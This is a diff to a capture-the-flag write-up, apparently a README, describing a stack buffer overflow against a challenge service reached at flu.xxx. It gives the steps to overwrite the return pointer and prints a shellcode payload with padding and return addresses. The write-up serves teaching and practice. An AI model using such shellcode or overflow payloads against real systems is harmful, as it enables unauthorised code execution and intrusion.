@@ -15,7 +15,7 @@ nc flu.xxx 2020
 
 Pass a long enough input string to the service to change the function's return pointer. Redirect code execution to the beginning of this string, where you have your shellcode.
 
-Something like the following will do just fine:
+Something like the following will do just fine (`exploit.py` can be found [here](./exploit.py)):
 
 ```txt
 b'-\x0b\xd8\x9a\xac\x15\xa1n/\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94"\x80\n\x9c\x03\xa0\x10\xec;\xbf\xf0\xd0#\xbf\xf8\xc0#\xbf\xfc\x82\x10 ;\x91\xd0 \x10XXXXXXXX\xff\xff\xebxXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\xff\xff\xebx\xff\xff\xebp'
